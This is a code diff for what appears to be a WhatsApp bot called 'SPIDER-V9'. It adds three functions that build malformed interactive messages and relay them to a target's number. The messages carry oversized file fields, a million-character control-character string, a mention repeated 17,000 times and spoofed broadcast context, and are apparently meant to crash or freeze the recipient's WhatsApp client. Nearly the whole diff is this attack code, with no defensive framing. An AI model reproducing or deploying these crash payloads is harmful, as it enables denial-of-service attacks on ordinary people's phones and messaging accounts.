@@ -412,41 +412,261 @@ const fake = {
                     }
                 }
             }
-        }	
-// Define the invisible function
-async function invisibleAction(sam, target, fake) {
-    const browser = await puppeteer.launch();
-    const page = await browser.newPage();
-
-    // Create an invisible div on the page
-    await page.evaluate(() => {
-        const statusTracker = document.createElement('div');
-        statusTracker.style.display = 'none'; // Make it invisible
-        document.body.appendChild(statusTracker);
-        return statusTracker; // Return the element for further use
-    });
-	// Append it to the body// Append it to the body
-
-    for (let i = 0; i < 2; i++) {
-        await buk1(sam, target, "Spider", 1020000, ptcp = true);
-        sendRp(target, fake);
-        await sendRp(target, fake);
-        await beta2(sam, target, fake);
-        await sendP(target, fake);
-        await beta1(sam, target, fake);
-        
-        // Update status tracker (optional)
-          // Update status tracker (optional)
-        await page.evaluate((i, target) => {
-            const statusTracker = document.body.lastChild; // Assuming it's the last child added
-            statusTracker.innerText += (`Attempt ${i + 1} completed for ${target}n`);
-        }, i, target);
+        }
+async function ClPm(target, spider, cct = false, ptcp = false) {
+   let etc = generateWAMessageFromContent(target,
+    proto.Message.fromObject({
+     viewOnceMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         title: "",
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 9007199254740991,
+          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+          fileName: "🩸𝐒𝐏𝐈𝐃𝐄𝐑 𝐂𝐫𝐚𝐬𝐡 ϟ🦠",
+          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1723855952",
+          contactVcard: true,
+          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+          jpegThumbnail: spider
+         },
+         hasMediaAttachment: true
+        },
+        body: {
+         text: "𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 𝐓𝐇𝐄 𝐒𝐌𝐀𝐒𝐇𝐄𝐑〽️"
+        },
+        nativeFlowMessage: {
+         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
+         buttons: [
+          cct ? {
+           name: "single_select",
+           buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐊𝐢𝐧𝐠 𝐒𝐚𝐦 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+          } : {
+           name: "payment_method",
+           buttonParamsJson: ""
+          },
+          {
+           name: "call_permission_request",
+           buttonParamsJson: "{}"
+          },
+          {
+           name: "payment_method",
+           buttonParamsJson: "{}"
+          },
+          {
+           name: "single_select",
+           buttonParamsJson: "{\"title\":\"✨⃟༑⌁𝐒𝐏𝐈𝐃𝐄𝐑 𝐂𝐑𝐀𝐒𝐇〽️\",\"sections\":[{\"title\":\"𝐒𝐀𝐌 𝐈𝐒 𝐇𝐄𝐑𝐄\",\"rows\":[]}]}"
+          },
+          {
+           name: "galaxy_message",
+           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+          },
+          {
+           name: "mpm",
+           buttonParamsJson: "{}"
+          }
+         ]
+        }
+       }
+      }
+     }
+    }), {
+     userJid: target,
+     quoted: fake
     }
+   );
 
-    await browser.close();
-}
-// Replace 'spider' with the invisible function in your command handling
-    		
+   await sam.relayMessage(target, etc.message, ptcp ? {
+    participant: {
+     jid: target
+    }
+   } : {});
+   console.log(chalk.green("Send Bug By Spider-V9〽️"));
+  };
+// Define the invisible function
+  const VisiX = {
+   key: {
+    remoteJid: 'p',
+    fromMe: false,
+    participant: '0@s.whatsapp.net'
+   },
+   message: {
+    "interactiveResponseMessage": {
+     "body": {
+      "text": "Sent",
+      "format": "DEFAULT"
+     },
+     "nativeFlowResponseMessage": {
+      "name": "galaxy_message",
+      "paramsJson": {\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐒𝐩𝐢𝐝𝐞𝐫 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 𝐓𝐑𝐀𝐒𝐇𝐄𝐑⧭‏⭑‌${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"},
+      "version": 3
+     }
+    }
+   }
+  }
+async function InVisiXz(target, spider, cct = false, ptcp = false) {
+   let etc = generateWAMessageFromContent(target,
+    proto.Message.fromObject({
+     viewOnceMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         title: "",
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 9007199254740991,
+          mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
+          fileName: "🩸𝐃𝐄𝐕𝐈𝐋-𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9🦠",
+          fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
+          directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1723855952",
+          contactVcard: true,
+          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+          jpegThumbnail: spider
+         },
+         hasMediaAttachment: true
+        },
+        body: {
+         text: "⭑‌𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9‏⭑‌"
+        },
+        nativeFlowMessage: {
+         messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
+         buttons: [
+          cct ? {
+           name: "single_select",
+           buttonParamsJson: "{\"title\":\"𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ϟ〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+          } : {
+           name: "payment_method",
+           buttonParamsJson: ""
+          },
+          {
+           name: "call_permission_request",
+           buttonParamsJson: "{}"
+          },
+          {
+           name: "payment_method",
+           buttonParamsJson: "{}"
+          },
+          {
+           name: "single_select",
+           buttonParamsJson: "{\"title\":\"✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9ϟ〽️\",\"sections\":[{\"title\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
+          },
+          {
+           name: "galaxy_message",
+           buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
+          },
+          {
+           name: "mpm",
+           buttonParamsJson: "{}"
+          }
+         ]
+        }
+       }
+      }
+     }
+    }), {
+     userJid: target,
+     quoted: VisiX
+    }
+   );
+
+   await sam.relayMessage(target, etc.message, ptcp ? {
+    participant: {
+     jid: target
+    }
+   } : {});
+   console.log(chalk.green("Send Bug By SPIDER-V9〽️"));
+  };
+  async function StuckNull(target, spider, Ptcp = true) {
+   await sam.relayMessage(target, {
+     ephemeralMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 1316134911,
+          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+          fileName: "⭑‌⟅ ༑ ▾ 𝐙‌𝐍‌𝐗 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌",
+          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1726867151",
+          contactVcard: true,
+          jpegThumbnail: spider,
+         },
+         hasMediaAttachment: true,
+        },
+        body: {
+         text: "⭑‌⟅ ༑ ▾ 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌\n" + "@254742491666".repeat(17000),
+        },
+        nativeFlowMessage: {
+         buttons: [{
+           name: "cta_url",
+           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ϟ〽️', url: \"https://youtube.com/@king_sam_hub\", merchant_url: \"https://youtube.com/@king_sam_hub\" }",
+          },
+          {
+           name: "call_permission_request",
+           buttonParamsJson: "{}",
+          },
+         ],
+         messageParamsJson: "{}",
+        },
+        contextInfo: {
+         mentionedJid: ["6285655649546@s.whatsapp.net"],
+         forwardingScore: 1,
+         isForwarded: true,
+         fromMe: false,
+         participant: "0@s.whatsapp.net",
+         remoteJid: "status@broadcast",
+         quotedMessage: {
+          documentMessage: {
+           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+           fileLength: "9999999999999",
+           pageCount: 1316134911,
+           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
+           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mediaKeyTimestamp: "1724474503",
+           contactVcard: true,
+           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+           jpegThumbnail: "",
+          },
+         },
+        },
+       },
+      },
+     },
+    },
+    Ptcp ? {
+     participant: {
+      jid: target
+     }
+    } : {}
+   );
+   console.log(chalk.green("Send Bug By SPIDER-V9〽️"));
+  };
+
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
